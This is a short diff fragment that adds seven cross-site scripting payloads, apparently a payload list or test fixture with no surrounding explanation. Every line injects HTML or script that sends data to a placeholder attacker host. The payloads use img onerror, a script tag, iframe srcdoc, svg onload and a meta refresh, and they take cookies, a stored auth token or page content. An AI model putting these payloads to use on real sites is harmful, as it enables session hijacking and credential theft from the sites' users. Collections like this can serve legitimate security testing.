@@ -1,0 +1,7 @@
+<img src="x" onerror="fetch('https://attacker.com/exfil?cookie='+document.cookie)">
+<script>
+fetch('https://yourburpcollab.net/capture?jwt='+localStorage.getItem('auth_token'));
+</script>
+<iframe srcdoc="<script>location='https://evil.me/'+btoa(document.body.innerHTML)</script>"></iframe>
+<svg/onload="fetch('https://evil.io/c/'+btoa(document.cookie))">
+<meta http-equiv="refresh" content="0;url=https://evil.com/?steal='+document.cookie">
